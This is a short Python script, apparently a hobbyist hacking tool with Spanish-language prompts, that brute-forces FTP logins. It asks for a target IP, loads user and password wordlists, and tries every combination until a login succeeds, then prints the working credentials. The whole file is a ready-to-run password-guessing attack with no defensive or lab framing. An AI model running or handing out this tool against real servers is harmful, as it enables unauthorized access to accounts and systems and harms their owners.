import signal
import socket
from tqdm import tqdm
from ftplib import FTP
from colorama import Fore, Back, Style


print(Fore.CYAN + '''
.d8888. d8888b.  .d8b.  d8888b. d888888b  .d8b.   .d8b.   .d8b.  
88'  YP 88  `8D d8' `8b 88  `8D `~~88~~' d8' `8b d8' `8b d8' `8b 
`8bo.   88oodD' 88ooo88 88oobY'    88    88ooo88 88ooo88 88ooo88 
  `Y8b. 88~~~   88~~~88 88`8b      88    88~~~88 88~~~88 88~~~88 
db   8D 88      88   88 88 `88.    88    88   88 88   88 88   88 
`8888Y' 88      YP   YP 88   YD    YP    YP   YP YP   YP YP   YP 
''' + Style.RESET_ALL)

print(Fore.GREEN + "Creado por Spartaa" + Style.RESET_ALL)
print(Back.RED + "Recuerda agregar el listado de USUARIOS y CONTRASEÑAS en el código.\n" + Style.RESET_ALL) 

def valida_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except:
        return False

#Función para detener script utilizando teclas: CTRL + C
def pulsarcontrolc(sig, frame):
    print("Haz pulsado CTRL+C. Detenemos el script.\n")
    exit(0)

signal.signal(signal.SIGINT,pulsarcontrolc)

servidor_ftp = input(Fore.CYAN + "\n[+] Ingresa una dirección IP: " + Style.RESET_ALL)
print("\n")
direccion_ip = valida_ip(servidor_ftp)

if direccion_ip == True:
    usuarios_ftp = 'usuarios.txt' #Debes ingresar el archivo de usuarios.
    contrasenas_ftp = 'contraseñas.txt' #Debes ingresar el archivo de contraseñas.

    with open(usuarios_ftp, 'r') as usuario_ftp:
        usuarios = usuario_ftp.read().splitlines()

    with open(contrasenas_ftp, 'r') as contrasena_ftp:
        contrasenas = contrasena_ftp.read().splitlines()

    for usuario in usuarios:
        for contrasena in tqdm(contrasenas, desc="Progreso", position=0, leave=False, ncols=15):
            try:
                ftp = FTP(servidor_ftp)
                ftp.login(user=usuario, passwd=contrasena)
                print(Fore.GREEN + f"[+] Conexión exitosa con usuario: {usuario} y contraseña: {contrasena}\n" + Style.RESET_ALL)
                ftp.quit()
                exit()

            except Exception as e:
                print(Fore.RED + f"[-] Falló con usuario: {usuario} y contraseña: {contrasena} en {servidor_ftp}" + Style.RESET_ALL)
                try:
                    ftp.quit()
                except:
                    pass

elif direccion_ip == False:
    print(Fore.MAGENTA + "[-] ERROR: Debes ingresar una dirección IP válida\n" + Style.RESET_ALL)
else:
    print(Back.RED + "ERROR: ha existido algún problema en la ejecución del script.\n" + Style.RESET_ALL)


